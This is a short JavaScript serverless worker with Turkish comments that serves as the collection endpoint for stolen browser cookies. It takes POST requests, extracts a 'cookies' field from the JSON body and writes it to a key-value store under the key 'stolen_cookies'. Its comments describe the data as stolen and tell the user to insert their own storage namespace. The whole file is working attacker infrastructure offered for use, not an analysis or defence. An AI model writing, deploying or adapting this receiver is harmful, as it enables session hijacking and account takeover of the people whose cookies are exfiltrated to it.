addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  if (request.method === 'POST') {
    try {
      const body = await request.json();  // Gelen JSON'u al
      const cookies = body.cookies;  // Cookie'leri çek
      
      // Çalınan cookie'leri sakla veya logla – örneğin, KV Storage'a yaz
      await YOUR_KV_NAMESPACE.put('stolen_cookies', cookies);  // KV namespace'inizi buraya koyun
      
      return new Response('Başarılı, cookie alındı.', { status: 200 });
    } catch (error) {
      return new Response('Hata oluştu.', { status: 400 });
    }
  }
  return new Response('Geçersiz istek.', { status: 400 });
}